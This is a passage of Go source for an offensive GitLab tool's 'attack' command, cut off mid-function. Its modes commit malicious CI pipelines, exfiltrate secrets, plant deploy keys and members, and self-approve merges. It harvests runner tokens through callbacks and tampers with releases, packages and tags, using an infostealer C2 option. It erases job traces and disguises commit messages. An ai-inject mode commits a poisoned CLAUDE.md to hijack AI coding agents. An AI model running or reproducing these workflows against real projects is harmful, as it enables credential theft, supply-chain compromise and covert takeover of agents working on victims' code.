package cmd

import (
	"context"
	"crypto/x509"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/mr-pmillz/gogatoz/pkg/attack"
	payloadgen "github.com/mr-pmillz/gogatoz/pkg/attack/payloads"
	ror "github.com/mr-pmillz/gogatoz/pkg/attack/ror"
	"github.com/mr-pmillz/gogatoz/pkg/attack/scriptinject"
	secdump "github.com/mr-pmillz/gogatoz/pkg/attack/secretsdump"
	"github.com/mr-pmillz/gogatoz/pkg/attack/tamper"
	"github.com/mr-pmillz/gogatoz/pkg/gitlabx"
	"github.com/mr-pmillz/gogatoz/pkg/pipeline"
	"github.com/mr-pmillz/gogatoz/pkg/pivot"
	"github.com/spf13/cobra"
)

const (
	payloadPwnRequest        = "pwn-request"
	payloadRor               = "ror"
	payloadRunnerOnRunner    = "runner-on-runner"
	payloadRunnerOnRunnerAlt = "runneronrunner"
)

// Flags for attack command
var (
	atkTarget      string
	atkBranch      string
	atkMessage     string
	atkAuthorName  string
	atkAuthorEmail string
	// CI content sources (exactly one when committing CI)
	atkCIInline string
	atkCIFile   string
	atkCIStdin  bool
	// Modes
	atkCommitCI bool
	atkSecrets  bool // run secrets exfil attack mode (commits pipeline)
	atkCleanup  bool // cleanup mode (remove branch/CI, revoke keys, remove member)
	// Discovery / targeting
	atkDiscoverTags bool
	atkExecutor     string
	// Payload generation (local rendering or as CI source)
	atkPayload     string // ror-shell | pwn-request | ror | runner-on-runner | secrets | secrets-exfil
	atkPayloadOnly bool
	// Common payload options
	atkJobName         string
	atkStage           string
	atkTags            string // comma-separated
	atkImage           string
	atkManual          bool
	atkArtifactsPath   string
	atkArtifactsExpire string
	// Staging / deconflict options
	atkDeconflict string // fail|suffix|force
	// ror-shell specific
	atkCmd      string
	atkDownload string
	// pwn-request specific
	atkTargetBranchRegex string
	// runner-on-runner specific
	atkScriptURL string
	atkOS        string
	atkKeepAlive int
	// secrets exfil specific
	atkWebhook     string
	atkPubkeyFile  string
	atkPrivkeyFile string
	atkExfilMethod string
	atkExfilTarget string
	atkNoWait      bool
	atkWaitTimeout time.Duration
	// secrets API dump options
	atkWithProjVars     bool
	atkWithGroupVars    bool
	atkGroupID          string
	atkIncludeProtected bool
	// secrets logs scraping options
	atkLogs             bool
	atkLogsRef          string
	atkLogsMaxPipelines int
	atkLogsMaxJobs      int
	// secrets artifacts scraping options
	atkArtifacts             bool
	atkArtifactsRef          string
	atkArtifactsMaxPipelines int
	atkArtifactsMaxJobs      int
	atkArtifactsMaxZipBytes  int64
	atkArtifactsMaxFileBytes int
	// Persistence modes
	atkDeployKey  bool
	atkKeyTitle   string
	atkKeyPath    string
	atkAddMember  bool
	atkMemberUser string
	atkMemberRole string
	// Cleanup action flags
	atkCleanupBranch     string
	atkCleanupCI         bool
	atkRevokeDeployKey   int64
	atkRemoveMemberID    int64
	atkCleanupPipeline   int64 // delete a specific pipeline by ID
	atkCleanupJobs       bool  // erase all job traces on recent pipelines
	atkCleanupJobsRef    string
	atkCleanupJobsMax    int
	atkCleanupJobsDelete bool // also delete the pipelines after erasing jobs
	// MR creation flags (used with --commit-ci or --ai-inject)
	atkCreateMR       bool
	atkMRTitle        string
	atkMRDescription  string
	atkMRTargetBranch string
	// AI injection mode
	atkAIInject     bool
	atkAIConfigFile string
	atkAIPrompt     string
	atkAIPromptFile string
	// Script injection mode (workflow hopping)
	atkInjectScript      bool
	atkScriptPath        string
	atkScriptPayload     string
	atkScriptPayloadFile string
	atkScriptPrepend     bool // prepend (default) vs append
	atkTriggerPipeline   bool // trigger pipeline after injection
	// Auto-merge mode (supply chain)
	atkAutoMerge       bool
	atkAutoMergeFile   string // file to modify (default: README.md)
	atkAutoMergeRemove bool   // remove source branch after merge
	// git-hook payload options
	atkHookType string // post-checkout, post-merge, pre-push
	// cache-poison payload options
	atkCacheKey  string
	atkCachePath string
	atkPoisonCmd string
	// tamper modes
	atkTamperRelease bool   // tamper with a release
	atkTamperPackage bool   // tamper with a package
	atkTagName       string // release tag name
	atkReleaseName   string // new release name
	atkReleaseDesc   string // new release description
	atkLinkName      string // release link name to replace
	atkLinkURL       string // new URL for replaced link
	atkAddLinkName   string // name of link to add
	atkAddLinkURL    string // URL of link to add
	atkPackageName   string // package name for tamper
	atkPackageVer    string // package version for tamper
	atkPackageFile   string // local file to upload as package
	// harvest mode
	atkHarvest        bool   // token harvest mode
	atkHarvestListen  string // listen address for harvest callback
	atkHarvestTimeout string // harvest timeout duration
	// tamper-tag mode (Trivy-style supply chain attack)
	atkTamperTag            bool   // tag poisoning mode
	atkTamperTagFile        string // file to replace in the tagged commit tree
	atkTamperTagPayload     string // inline payload content for replaced file
	atkTamperTagPayloadFile string // read replacement file content from local file
	atkTamperTagSource      string // source ref to base the new commit tree on
	atkTamperTagC2          string // C2 URL for auto-generated infostealer payload
	atkTamperTagEncKey      string // AES encryption key for infostealer exfil data
	atkTamperTagRSAPubFile  string // RSA-4096 public key PEM file for hybrid encryption
	atkTamperTagBackup      string // backup exfil git repo URL for infostealer
	atkTamperTagOriginal    bool   // append original file content after payload (stealth)
	atkTamperTagProcScan    bool   // scan /proc/*/environ for secrets from parallel processes
	atkTamperTagMemDump     bool   // attempt runner worker memory extraction
	atkTamperTagExtended    bool   // extended credential sweep (crypto wallets, shell history, etc.)
	// LOTP injection mode (Living off the Pipeline)
	atkLOTPInject bool   // commit weaponized LOTP config to branch
	atkLOTPTool   string // target tool: npm-gyp, npm, make, pytest, goreleaser, gradle, terraform
)

// narrow interface to allow test fakes
type attackRunner interface {
	CommitCIPipeline(ctx context.Context, projectID any, branch, yamlContent, message string) (string, error)
}

type secretsRunner interface {
	RunExfil(ctx context.Context, projectID any, branch, pubkey string, runnerTags []string, exfil attack.ExfilOptions) (string, error)
}

var newAttacker = func(gl *gitlabx.Client, baseURL, authorName, authorEmail string, timeout time.Duration) attackRunner {
	return attack.NewAttacker(gl, baseURL, authorName, authorEmail, timeout)
}

var newSecretsRunner = func(gl *gitlabx.Client, baseURL, authorName, authorEmail string, timeout time.Duration) secretsRunner {
	att := attack.NewAttacker(gl, baseURL, authorName, authorEmail, timeout)
	return attack.NewSecretsAttack(att)
}

// Output structure for --secrets mode when --output-json is set.
type secretsOutput struct {
	PipelineURL      string                    `json:"pipeline_url"`
	JobID            int64                     `json:"job_id,omitempty"`
	JobStatus        string                    `json:"job_status,omitempty"`
	ExfilSecrets     map[string]string         `json:"exfil_secrets,omitempty"`
	ProjectVariables []secdump.Variable        `json:"project_variables,omitempty"`
	GroupVariables   []secdump.Variable        `json:"group_variables,omitempty"`
	LogFindings      []secdump.Finding         `json:"log_findings,omitempty"`
	ArtifactFindings []secdump.ArtifactFinding `json:"artifact_findings,omitempty"`
}

// ensureBranchDeconflict picks a branch name according to strategy and performs deletions for force.
func ensureBranchDeconflict(ctx context.Context, client *gitlabx.Client, projectID any, desired, strategy, authorName, authorEmail string) (string, error) {
	att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), authorName, authorEmail, 0)
	name := strings.TrimSpace(desired)
	if name == "" {
		name = gogatozAttack
	} //nolint:goconst
	st := strings.ToLower(strings.TrimSpace(strategy))
	if st == "" {
		st = "suffix"
	}
	exists, err := att.BranchExists(ctx, projectID, name)
	if err != nil {
		return "", err
	}
	switch st {
	case "fail":
		if exists {
			return "", fmt.Errorf("branch %s already exists (use --deconflict)", name)
		}
		return name, nil
	case "force":
		if exists {
			if err := att.DeleteBranch(ctx, projectID, name); err != nil {
				return "", fmt.Errorf("delete branch: %w", err)
			}
		}
		return name, nil
	case "suffix":
		if !exists {
			return name, nil
		}
		for i := 1; i <= 99; i++ {
			cand := fmt.Sprintf("%s-%d", name, i)
			e, err := att.BranchExists(ctx, projectID, cand)
			if err != nil {
				return "", err
			}
			if !e {
				return cand, nil
			}
		}
		return "", fmt.Errorf("could not find available suffix for %s", name)
	default:
		return "", fmt.Errorf("unknown --deconflict strategy: %s", strategy)
	}
}

var attackCmd = &cobra.Command{
	Use:   "attack",
	Short: "Run attack workflows against a target GitLab project",
	Long:  "Attack modes allow committing CI pipelines or other actions to validate or exploit misconfigurations.",
	RunE: func(cmd *cobra.Command, args []string) error {
		// New: payload-only path prints YAML/JSON and exits; no token/target required
		if atkPayloadOnly {
			if strings.TrimSpace(atkPayload) == "" {
				return fmt.Errorf("--payload is required when --payload-only is set")
			}
			// LOTP payloads use a different output format (JSON with file paths)
			lp := strings.ToLower(strings.TrimSpace(atkPayload))
			if strings.HasPrefix(lp, "lotp-") || lp == "gyp" {
				lotpTool := strings.TrimPrefix(lp, "lotp-")
				if lotpTool == lp { // no lotp- prefix; must be "gyp"
					lotpTool = lp
				}
				if strings.TrimSpace(atkCmd) == "" {
					return fmt.Errorf("--cmd is required for LOTP payloads")
				}
				p, perr := payloadgen.GenerateLOTPPayload(lotpTool, atkCmd)
				if perr != nil {
					return fmt.Errorf("generate LOTP payload: %w", perr)
				}
				type fileOut struct {
					Path    string `json:"path"`
					Content string `json:"content"`
				}
				out := struct {
					Tool        string    `json:"tool"`
					Files       []fileOut `json:"files"`
					Description string    `json:"description"`
					Reference   string    `json:"reference"`
				}{
					Tool:        p.Tool,
					Description: p.Description,
					Reference:   p.Reference,
				}
				for _, f := range p.Files {
					out.Files = append(out.Files, fileOut{Path: f.Path, Content: f.Content})
				}
				b, _ := json.MarshalIndent(out, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			yaml, err := renderPayload()
			if err != nil {
				return err
			}
			_, err = fmt.Fprint(cmd.OutOrStdout(), yaml)
			return err
		}

		if token == "" {
			return fmt.Errorf("GitLab token is required. Provide --token or set GITLAB_TOKEN")
		}
		if strings.TrimSpace(atkTarget) == "" {
			return fmt.Errorf("--target is required (project ID or path-with-namespace)")
		}
		// Mode selection: exactly one of the attack modes (unless discovery or payload-only)
		if !atkDiscoverTags {
			modes := 0
			if atkCommitCI {
				modes++
			}
			if atkSecrets {
				modes++
			}
			if atkCleanup {
				modes++
			}
			if atkDeployKey {
				modes++
			}
			if atkAddMember {
				modes++
			}
			if atkAIInject {
				modes++
			}
			if atkInjectScript {
				modes++
			}
			if atkAutoMerge {
				modes++
			}
			if atkTamperRelease {
				modes++
			}
			if atkTamperPackage {
				modes++
			}
			if atkHarvest {
				modes++
			}
			if atkTamperTag {
				modes++
			}
			if atkLOTPInject {
				modes++
			}
			if modes != 1 {
				return fmt.Errorf("select exactly one mode: --commit-ci, --secrets, --cleanup, --deploy-key, --add-member, --ai-inject, --inject-script, --lotp-inject, --auto-merge, --tamper-release, --tamper-package, --tamper-tag, or --harvest (or use --payload-only or --discover-tags)")
			}
		}

		// Build client with global knobs (reuse code style from search/enumerate)
		ctx := context.Background()
		clOpts := []gitlabx.Option{gitlabx.WithRateLimit(rateRPS, rateBurst), gitlabx.WithRetry(retryMax)}
		if ua := userAgent; strings.TrimSpace(ua) != "" {
			clOpts = append(clOpts, gitlabx.WithUserAgent(ua))
		}
		var idleTO, tlsTO, expectTO, reqTO time.Duration
		if s := strings.TrimSpace(httpIdleTimeout); s != "" {
			if d, e := time.ParseDuration(s); e != nil {
				return fmt.Errorf("invalid --http-idle-timeout: %w", e)
			} else {
				idleTO = d
			}
		}
		if s := strings.TrimSpace(httpTLSTimeout); s != "" {
			if d, e := time.ParseDuration(s); e != nil {
				return fmt.Errorf("invalid --http-tls-timeout: %w", e)
			} else {
				tlsTO = d
			}
		}
		if s := strings.TrimSpace(httpExpectTimeout); s != "" {
			if d, e := time.ParseDuration(s); e != nil {
				return fmt.Errorf("invalid --http-expect-timeout: %w", e)
			} else {
				expectTO = d
			}
		}
		if s := strings.TrimSpace(httpRequestTimeout); s != "" {
			if d, e := time.ParseDuration(s); e != nil {
				return fmt.Errorf("invalid --http-req-timeout: %w", e)
			} else {
				reqTO = d
			}
		}
		if httpMaxIdle > 0 || httpMaxIdlePerHost > 0 {
			clOpts = append(clOpts, gitlabx.WithHTTPPool(httpMaxIdle, httpMaxIdlePerHost))
		}
		if idleTO > 0 || tlsTO > 0 || expectTO > 0 || reqTO > 0 {
			clOpts = append(clOpts, gitlabx.WithHTTPTimeouts(idleTO, tlsTO, expectTO, reqTO))
		}
		if insecureSkipTLS {
			clOpts = append(clOpts, gitlabx.WithInsecureTLS(true))
		}
		if p := strings.TrimSpace(caCertPath); p != "" {
			pem, err := os.ReadFile(p)
			if err != nil {
				return fmt.Errorf("read --ca-cert: %w", err)
			}
			pool := x509.NewCertPool()
			if !pool.AppendCertsFromPEM(pem) {
				return fmt.Errorf("--ca-cert: no valid PEM certificates found")
			}
			clOpts = append(clOpts, gitlabx.WithRootCAs(pool))
		}
		clOpts = appendSOCKS5Option(clOpts)
		client, err := gitlabx.New(strings.TrimSpace(gitlabURL), token, clOpts...)
		if err != nil {
			return err
		}

		if strings.TrimSpace(atkBranch) == "" {
			atkBranch = gogatozAttack
		}

		// Discovery: list runner tags and exit
		if atkDiscoverTags {
			tags, _, err := ror.DiscoverProjectRunnerTags(ctx, client, atkTarget)
			if err != nil {
				return err
			}
			if strings.TrimSpace(atkExecutor) != "" {
				tags = ror.FilterTagsByExecutor(tags, atkExecutor)
			}
			if outputJSON {
				// print as simple JSON array
				q := make([]string, 0, len(tags))
				for _, t := range tags {
					q = append(q, fmt.Sprintf("%q", t))
				}
				_, err := fmt.Fprintf(cmd.OutOrStdout(), "[%s]\n", strings.Join(q, ", "))
				if err != nil {
					return err
				}
				return nil
			}
			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Runner tags: %s", strings.Join(tags, ", ")))
			return nil
		}

		// deploy-key mode: create a deploy key with write access
		if atkDeployKey {
			if strings.TrimSpace(atkKeyPath) == "" {
				return fmt.Errorf("--key-path is required when using --deploy-key")
			}
			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			pers := attack.NewPersistence(att)
			keyID, pubKey, err := pers.CreateDeployKey(ctx, atkTarget, atkKeyTitle, atkKeyPath)
			if err != nil {
				return err
			}
			if outputJSON {
				b, _ := json.MarshalIndent(struct {
					DeployKeyID    int64  `json:"deploy_key_id"`
					PublicKey      string `json:"public_key"`
					PrivateKeyPath string `json:"private_key_path"`
				}{DeployKeyID: keyID, PublicKey: strings.TrimSpace(pubKey), PrivateKeyPath: atkKeyPath}, "", "  ")
				_, err = fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Deploy key created (ID: %d)", keyID))
			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Public key: %s", strings.TrimSpace(pubKey)))
			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Private key saved to: %s", atkKeyPath))
			return nil
		}

		// add-member mode: add a user as project member
		if atkAddMember {
			if strings.TrimSpace(atkMemberUser) == "" {
				return fmt.Errorf("--member-username is required when using --add-member")
			}
			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			pers := attack.NewPersistence(att)
			if err := pers.AddProjectMemberByUsername(ctx, atkTarget, atkMemberUser, atkMemberRole); err != nil {
				return err
			}
			role := atkMemberRole
			if role == "" {
				role = "developer"
			}
			if outputJSON {
				b, _ := json.MarshalIndent(struct {
					Username    string `json:"username"`
					AccessLevel string `json:"access_level"`
				}{Username: atkMemberUser, AccessLevel: role}, "", "  ")
				_, err = fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Added %s as %s to project", atkMemberUser, role))
			return nil
		}

		// cleanup mode
		if atkCleanup {
			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			_, _ = att.SetupUser(ctx)
			type cleanupAction struct {
				Action  string `json:"action"`
				Target  string `json:"target,omitempty"`
				Success bool   `json:"success"`
				Error   string `json:"error,omitempty"`
			}
			var actions []cleanupAction
			// Remove CI file if requested
			if atkCleanupCI {
				branch := strings.TrimSpace(atkBranch)
				if branch == "" {
					branch = gogatozAttack
				}
				err := att.DeleteFile(ctx, atkTarget, branch, ".gitlab-ci.yml", "Remove CI file via GoGatoZ")
				ca := cleanupAction{Action: "delete-ci-file", Target: branch}
				if err != nil {
					ca.Success = false
					ca.Error = err.Error()
				} else {
					ca.Success = true
				}
				actions = append(actions, ca)
			}
			// Delete branch
			if strings.TrimSpace(atkCleanupBranch) != "" {
				err := att.DeleteBranch(ctx, atkTarget, strings.TrimSpace(atkCleanupBranch))
				ca := cleanupAction{Action: "delete-branch", Target: strings.TrimSpace(atkCleanupBranch)}
				if err != nil {
					ca.Success = false
					ca.Error = err.Error()
				} else {
					ca.Success = true
				}
				actions = append(actions, ca)
			}
			// Revoke deploy key
			if atkRevokeDeployKey > 0 {
				err := att.RevokeDeployKey(ctx, atkTarget, atkRevokeDeployKey)
				ca := cleanupAction{Action: "revoke-deploy-key", Target: fmt.Sprintf("%d", atkRevokeDeployKey)}
				if err != nil {
					ca.Success = false
					ca.Error = err.Error()
				} else {
					ca.Success = true
				}
				actions = append(actions, ca)
			}
			// Remove member by user ID
			if atkRemoveMemberID > 0 {
				err := att.RemoveProjectMember(ctx, atkTarget, atkRemoveMemberID)
				ca := cleanupAction{Action: "remove-member", Target: fmt.Sprintf("%d", atkRemoveMemberID)}
				if err != nil {
					ca.Success = false
					ca.Error = err.Error()
				} else {
					ca.Success = true
				}
				actions = append(actions, ca)
			}
			// Delete a specific pipeline
			if atkCleanupPipeline > 0 {
				err := att.DeletePipeline(ctx, atkTarget, atkCleanupPipeline)
				ca := cleanupAction{Action: "delete-pipeline", Target: fmt.Sprintf("%d", atkCleanupPipeline)}
				if err != nil {
					ca.Success = false
					ca.Error = err.Error()
				} else {
					ca.Success = true
				}
				actions = append(actions, ca)
			}
			// Erase job traces (and optionally delete) recent pipelines
			if atkCleanupJobs {
				maxP := atkCleanupJobsMax
				if maxP <= 0 {
					maxP = 5
				}
				count, err := att.EraseRecentPipelines(ctx, atkTarget, atkCleanupJobsRef, maxP, atkCleanupJobsDelete)
				verb := "erase-job-traces"
				if atkCleanupJobsDelete {
					verb = "erase-and-delete-pipelines"
				}
				ca := cleanupAction{Action: verb, Target: fmt.Sprintf("%d pipelines", count)}
				if err != nil {
					ca.Success = false
					ca.Error = err.Error()
				} else {
					ca.Success = true
				}
				actions = append(actions, ca)
			}
			if outputJSON {
				b, err := json.MarshalIndent(struct {
					Actions []cleanupAction `json:"actions"`
				}{Actions: actions}, "", "  ")
				if err != nil {
					return err
				}
				_, err = fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			for _, a := range actions {
				if a.Success {
					renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("%s %s", a.Action, a.Target))
				} else {
					renderError(cmd.OutOrStdout(), fmt.Sprintf("%s %s: %s", a.Action, a.Target, a.Error))
				}
			}
			return nil
		}

		// ai-inject mode: commit a poisoned AI config file
		if atkAIInject {
			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			if strings.TrimSpace(atkBranch) == "" {
				atkBranch = attack.GogatozAttacks
			}
			finalBranch, err := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
			if err != nil {
				return err
			}
			// Resolve prompt content
			prompt := strings.TrimSpace(atkAIPrompt)
			if prompt == "" && strings.TrimSpace(atkAIPromptFile) != "" {
				b, err := os.ReadFile(strings.TrimSpace(atkAIPromptFile))
				if err != nil {
					return fmt.Errorf("read --ai-prompt-file: %w", err)
				}
				prompt = string(b)
			}
			if prompt == "" {
				prompt = payloadgen.DefaultAIInjectionPrompt()
			}
			configFile := strings.TrimSpace(atkAIConfigFile)
			if configFile == "" {
				configFile = "CLAUDE.md"
			}
			if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
				return err
			}
			if strings.TrimSpace(atkMessage) == "" {
				atkMessage = "docs: update project configuration"
			}
			if err := att.UpsertFile(ctx, atkTarget, finalBranch, configFile, prompt, atkMessage); err != nil {
				return err
			}
			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed %s to branch %s\n", configFile, finalBranch)

			var mrURL string
			var mrIID int64
			if atkCreateMR {
				mr, mrErr := att.CreateMergeRequest(ctx, atkTarget, finalBranch, atkMRTargetBranch, atkMRTitle, atkMRDescription)
				if mrErr != nil {
					return fmt.Errorf("create merge request: %w", mrErr)
				}
				mrURL = mr.WebURL
				mrIID = mr.IID
				fmt.Fprintf(cmd.ErrOrStderr(), "[attack] merge request: %s\n", mrURL)
			}

			if outputJSON {
				out := struct {
					Branch          string `json:"branch"`
					ConfigFile      string `json:"config_file"`
					MergeRequestURL string `json:"merge_request_url,omitempty"`
					MergeRequestIID int64  `json:"merge_request_iid,omitempty"`
				}{
					Branch:          finalBranch,
					ConfigFile:      configFile,
					MergeRequestURL: mrURL,
					MergeRequestIID: mrIID,
				}
				b, _ := json.MarshalIndent(out, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Committed %s to branch %s", configFile, finalBranch))
			if mrURL != "" {
				renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Merge Request: %s", mrURL))
			}
			return nil
		}

		// auto-merge mode: create MR, self-approve, merge (supply chain attack)
		if atkAutoMerge {
			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			pers := attack.NewPersistence(att)

			// Resolve CI content or use a simple file modification
			filePath := strings.TrimSpace(atkAutoMergeFile)
			if filePath == "" {
				filePath = ".gitlab-ci.yml"
			}
			var content string
			if strings.TrimSpace(atkPayload) != "" {
				var perr error
				content, perr = renderPayload()
				if perr != nil {
					return perr
				}
			} else {
				ci, lerr := loadCIContent(atkCIInline, atkCIFile, atkCIStdin)
				if lerr != nil {
					return lerr
				}
				content = ci
			}
			if strings.TrimSpace(content) == "" {
				return fmt.Errorf("provide content via --ci-yaml, --ci-file, --ci-stdin, or --payload for --auto-merge")
			}

			if strings.TrimSpace(atkBranch) == "" {
				atkBranch = attack.GogatozAttacks
			}
			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
			if berr != nil {
				return berr
			}

			msg := strings.TrimSpace(atkMessage)
			if msg == "" {
				msg = "chore: update configuration"
			}
			mrTitle := strings.TrimSpace(atkMRTitle)
			if mrTitle == "" {
				mrTitle = "Update project configuration"
			}

			result, err := pers.RunAutoMerge(ctx, atkTarget,
				finalBranch, filePath, content, msg,
				mrTitle, atkMRDescription, atkMRTargetBranch)
			if err != nil && result == nil {
				return err
			}

			if outputJSON {
				b, _ := json.MarshalIndent(result, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("MR: %s (IID %d)", result.MRURL, result.MRIID))
			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Approvals required: %d, left: %d", result.Approval.ApprovalsRequired, result.Approval.ApprovalsLeft))
			if result.Approved {
				renderSuccess(cmd.OutOrStdout(), "Self-approved")
			} else if result.ApproveErr != "" {
				renderError(cmd.OutOrStdout(), fmt.Sprintf("Approve failed: %s", result.ApproveErr))
			}
			if result.Merged {
				renderSuccess(cmd.OutOrStdout(), "Merged to default branch")
			} else if result.MergeErr != "" {
				renderError(cmd.OutOrStdout(), fmt.Sprintf("Merge failed: %s", result.MergeErr))
			}
			return nil
		}

		// harvest mode: install git hooks, wait for callbacks, harvest tokens
		if atkHarvest {
			if strings.TrimSpace(atkWebhook) == "" {
				return fmt.Errorf("--webhook is required for --harvest (external URL reachable from runners)")
			}

			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			if _, err := att.SetupUser(ctx); err != nil {
				return fmt.Errorf("setup user: %w", err)
			}

			// Build and commit git-hook payload
			var tags []string
			if strings.TrimSpace(atkTags) != "" {
				for _, t := range strings.Split(atkTags, ",") {
					t = strings.TrimSpace(t)
					if t != "" {
						tags = append(tags, t)
					}
				}
			}
			hookYAML := payloadgen.GenerateGitHookYAML(payloadgen.GitHookOptions{
				Common: payloadgen.CommonOptions{
					JobName: strings.TrimSpace(atkJobName),
					Tags:    tags,
				},
				CallbackURL: strings.TrimSpace(atkWebhook),
				HookType:    strings.TrimSpace(atkHookType),
			})

			if strings.TrimSpace(atkBranch) == "" {
				atkBranch = attack.GogatozAttacks
			}
			pipelineURL, err := att.CommitCIPipeline(ctx, atkTarget, atkBranch, hookYAML, "Install CI hook via GoGatoZ")
			if err != nil {
				return fmt.Errorf("commit git-hook payload: %w", err)
			}
			fmt.Fprintf(cmd.ErrOrStderr(), "[harvest] git-hook payload committed: %s\n", pipelineURL)
			fmt.Fprintf(cmd.ErrOrStderr(), "[harvest] waiting for callbacks on %s...\n", atkHarvestListen)

			// Parse timeout
			harvestTimeout, terr := time.ParseDuration(atkHarvestTimeout)
			if terr != nil {
				harvestTimeout = 30 * time.Minute
			}

			// Start harvester
			h := pivot.NewHarvester(pivot.HarvestOptions{
				ListenAddr: atkHarvestListen,
				GitLabURL:  strings.TrimSpace(gitlabURL),
				Timeout:    harvestTimeout,
				Progress: func(e pivot.HarvestEvent) {
					if outputJSON {
						return
					}
					switch e.Type {
					case "listening":
						renderInfo(cmd.OutOrStdout(), e.Message)
					case "callback":
						renderInfo(cmd.OutOrStdout(), e.Message)
					case "credential":
						renderSuccess(cmd.OutOrStdout(), e.Message)
					case "error":
						renderError(cmd.OutOrStdout(), e.Message)
					}
				},
			})

			result, err := h.Run(ctx)
			if err != nil {
				return fmt.Errorf("harvest: %w", err)
			}

			if outputJSON {
				b, _ := json.MarshalIndent(result, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Harvest complete: %d callbacks, %d credentials", result.Callbacks, len(result.Credentials)))
			for _, c := range result.Credentials {
				valid := "unvalidated"
				if c.IsValid {
					valid = fmt.Sprintf("valid (user: %s)", c.Username)
				}
				renderInfo(cmd.OutOrStdout(), fmt.Sprintf("  %s (%s) from %s — %s", c.TokenType, c.TokenHash[:12], c.SourceKey, valid))
			}
			return nil
		}

		// tamper-release mode: modify release metadata and/or replace asset links
		if atkTamperRelease {
			tagName := strings.TrimSpace(atkTagName)
			if tagName == "" {
				return fmt.Errorf("--tag-name is required for --tamper-release")
			}
			opts := tamper.TamperReleaseOptions{
				NewName:        strings.TrimSpace(atkReleaseName),
				NewDescription: strings.TrimSpace(atkReleaseDesc),
			}
			if ln := strings.TrimSpace(atkLinkName); ln != "" && strings.TrimSpace(atkLinkURL) != "" {
				opts.ReplaceLinks = map[string]string{ln: strings.TrimSpace(atkLinkURL)}
			}
			if an := strings.TrimSpace(atkAddLinkName); an != "" && strings.TrimSpace(atkAddLinkURL) != "" {
				opts.AddLinks = map[string]string{an: strings.TrimSpace(atkAddLinkURL)}
			}
			replaced, added, err := tamper.TamperRelease(ctx, client, atkTarget, tagName, opts)
			if err != nil {
				return err
			}
			if outputJSON {
				out := struct {
					TagName  string `json:"tag_name"`
					Replaced int    `json:"links_replaced"`
					Added    int    `json:"links_added"`
				}{TagName: tagName, Replaced: replaced, Added: added}
				b, _ := json.MarshalIndent(out, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Tampered release %s: %d links replaced, %d added", tagName, replaced, added))
			return nil
		}

		// tamper-package mode: upload malicious package to Generic Packages registry
		if atkTamperPackage {
			pkgName := strings.TrimSpace(atkPackageName)
			pkgVer := strings.TrimSpace(atkPackageVer)
			pkgFile := strings.TrimSpace(atkPackageFile)
			if pkgName == "" || pkgVer == "" || pkgFile == "" {
				return fmt.Errorf("--package-name, --package-version, and --package-file are required for --tamper-package")
			}
			f, err := os.Open(pkgFile)
			if err != nil {
				return fmt.Errorf("open --package-file: %w", err)
			}
			defer f.Close()
			fileName := filepath.Base(pkgFile)
			result, err := tamper.PublishPackage(ctx, client, atkTarget, pkgName, pkgVer, fileName, f)
			if err != nil {
				return err
			}
			if outputJSON {
				b, _ := json.MarshalIndent(result, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Published %s/%s/%s", result.PackageName, result.PackageVersion, result.FileName))
			if result.URL != "" {
				renderInfo(cmd.OutOrStdout(), fmt.Sprintf("URL: %s", result.URL))
			}
			return nil
		}

		// tamper-tag mode: poison a git tag with modified file tree (Trivy-style supply chain attack)
		if atkTamperTag {
			tagName := strings.TrimSpace(atkTagName)
			if tagName == "" {
				return fmt.Errorf("--tag-name is required for --tamper-tag")
			}

			// Resolve payload content
			payload := strings.TrimSpace(atkTamperTagPayload)
			if payload == "" && strings.TrimSpace(atkTamperTagPayloadFile) != "" {
				b, perr := os.ReadFile(strings.TrimSpace(atkTamperTagPayloadFile))
				if perr != nil {
					return fmt.Errorf("read --tamper-tag-payload-file: %w", perr)
				}
				payload = string(b)
			}

			// If --tamper-tag-preserve-original, fetch original file content
			var originalContent string
			if atkTamperTagOriginal && payload == "" {
				att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
				targetFile := strings.TrimSpace(atkTamperTagFile)
				if targetFile == "" {
					targetFile = "entrypoint.sh"
				}
